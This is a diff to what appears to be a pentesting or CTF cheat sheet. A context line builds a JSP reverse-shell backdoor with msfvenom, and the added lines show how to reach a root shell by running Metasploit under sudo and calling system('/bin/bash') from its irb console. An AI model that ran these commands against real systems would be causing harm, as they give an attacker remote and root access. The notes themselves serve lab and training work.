@@ -81,3 +81,15 @@ https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credenti
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4449 -f war > backdoor.war
 ```
+
+
+## Sudo Metasploit exploit
+
+```
+sudo msfconsole
+```
+
+```
+irb
+system("/bin/bash")
+```
